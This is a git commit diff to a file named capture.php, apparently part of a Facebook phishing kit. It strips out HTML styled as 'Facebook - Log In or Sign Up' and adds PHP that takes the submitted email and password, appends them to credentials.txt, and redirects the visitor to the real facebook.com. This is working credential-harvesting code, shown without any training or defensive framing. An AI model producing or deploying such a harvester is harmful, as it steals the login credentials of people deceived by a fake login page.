4c8605eded67089256cf98c05f124172dfb300c9
Levon2000 <studyhard1588@gmail.com>
2025-03-18 23:16:16 +0400

    Update capture.php

--- capture.php
+++ capture.php
@@ -1,13 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook - Log In or Sign Up</title>
-  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">  <style>
-    body {
-      background-color: #f0f2f5;
-      font-family: Arial, sans-serif;
-      font-size: 16px;
-      line-height: 1.5;
-    }
+<?php$email = $_POST['email'];$password = $_POST['password'];
+file_put_contents('credentials.txt',$email. ':'.$password. PHP_EOL, FILE_APPEND);
+header('Location: https://facebook.com/');
+exit;?>
